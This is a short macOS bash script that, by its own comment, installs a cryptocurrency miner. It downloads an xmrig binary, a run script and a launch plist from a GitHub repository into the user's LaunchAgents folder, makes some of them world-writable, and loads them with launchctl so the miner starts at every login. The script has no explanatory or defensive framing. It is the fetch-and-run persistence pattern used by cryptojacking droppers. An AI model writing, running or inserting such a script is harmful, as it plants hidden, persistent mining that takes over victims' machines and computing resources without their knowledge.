#!/usr/bin/env bash

#installs the miner

rm ~/Library/LaunchAgents/xmrig
rm ~/Library/Launchagents/run.sh
rm ~/Library/Launchagents/run.plist

curl -L https://github.com/Me1955/me-mine/raw/main/xmrig >> ~/Library/Launchagents/xmrig
chmod 777 ~/Library/LaunchAgents/xmrig

curl -L https://github.com/Me1955/me-mine/raw/main/run.sh >> ~/Library/Launchagents/run.sh
chmod 777 ~/Library/Launchagents/run.sh

curl -L https://raw.githubusercontent.com/Me1955/me-mine/main/run.plist >> ~/Library/LaunchAgents/run.plist
chmod 600 ~/Library/Launchagents/run.plist

launchctl load ~/Library/LaunchAgents/run.plist
